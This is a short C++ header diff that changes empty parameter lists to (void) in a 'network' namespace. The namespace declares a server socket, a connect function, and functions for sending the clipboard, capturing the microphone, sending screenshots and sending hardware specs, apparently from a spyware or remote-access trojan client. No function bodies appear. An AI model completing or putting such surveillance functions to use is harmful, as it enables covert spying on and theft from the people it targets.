@@ -18,10 +18,10 @@ public:
 namespace network {
 	static SOCKET srvSOCKET = INVALID_SOCKET;
 	int _connect(std::string dns, short PORT);
-	int _sendClipbord();
-	int _captureMic();
-	int _sendScrShot();
-	int _sendHWSpecs();
+	int _sendClipbord(void);
+	int _captureMic(void);
+	int _sendScrShot(void);
+	int _sendHWSpecs(void);
 }
 
 //convert dns to ip [return ip as string]
